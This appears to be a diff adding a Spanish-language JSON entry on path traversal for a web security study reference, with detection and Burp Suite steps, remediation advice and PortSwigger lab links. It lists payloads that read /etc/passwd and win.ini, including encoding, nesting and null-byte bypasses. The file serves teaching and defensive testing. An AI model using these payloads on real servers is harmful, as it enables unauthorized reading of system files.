@@ -1,0 +1,53 @@
+{
+  "id": "path-traversal",
+  "name": "Path Traversal",
+  "category": "Server-side",
+  "severity": "High",
+  "aka": ["Directory Traversal", "LFI parcial", "../"],
+  "summary": "La aplicación usa input del usuario para construir una ruta de archivo sin validar, permitiendo salir del directorio previsto y leer (o a veces escribir) archivos arbitrarios del servidor.",
+  "where_to_look": [
+    "Parámetros que referencian archivos: filename, file, path, image, download, lang, template.",
+    "Funciones de descarga, previsualización de imágenes y carga de plantillas/idiomas."
+  ],
+  "detection": [
+    "Sustituye el nombre de archivo por ../../../../etc/passwd y observa si se devuelve el contenido.",
+    "En Windows prueba ..\\..\\..\\windows\\win.ini.",
+    "Si hay filtros, prueba codificación, secuencias anidadas o null bytes."
+  ],
+  "burp_steps": [
+    "Captura la petición que carga el archivo y mándala al Repeater.",
+    "Inyecta secuencias ../ hasta alcanzar la raíz y luego un archivo conocido (/etc/passwd).",
+    "Si filtra ../, prueba ....// (anidado), codificación URL simple/doble o rutas absolutas.",
+    "Si valida que empiece por una carpeta base, prepéndela: /var/www/images/../../../etc/passwd.",
+    "Si valida la extensión, prueba el null byte: ../../../etc/passwd%00.png."
+  ],
+  "payloads": {
+    "Básico": [
+      "../../../../etc/passwd",
+      "..\\..\\..\\..\\windows\\win.ini",
+      "/etc/passwd"
+    ],
+    "Bypass de filtros": [
+      "....//....//....//etc/passwd",
+      "..%2f..%2f..%2fetc%2fpasswd",
+      "..%252f..%252f..%252fetc%252fpasswd",
+      "/var/www/images/../../../etc/passwd",
+      "../../../etc/passwd%00.png"
+    ]
+  },
+  "commands": [],
+  "remediation": [
+    "Evita pasar input del usuario a APIs de filesystem; usa identificadores indirectos (un índice → ruta del lado servidor).",
+    "Canonicaliza la ruta y verifica que sigue dentro del directorio base permitido.",
+    "Valida contra una allowlist de nombres/extensiones."
+  ],
+  "portswigger_labs": [
+    {"title": "Path traversal simple, sin defensas", "difficulty": "APPRENTICE", "url": "https://portswigger.net/web-security/file-path-traversal/lab-simple"},
+    {"title": "Bypass de bloqueo de secuencias traversal no recursivo", "difficulty": "PRACTITIONER", "url": "https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively"},
+    {"title": "Bypass con null byte de validación de extensión", "difficulty": "PRACTITIONER", "url": "https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass"}
+  ],
+  "references": [
+    {"title": "PortSwigger — Path traversal", "url": "https://portswigger.net/web-security/file-path-traversal"},
+    {"title": "OWASP — Path Traversal", "url": "https://owasp.org/www-community/attacks/Path_Traversal"}
+  ]
+}
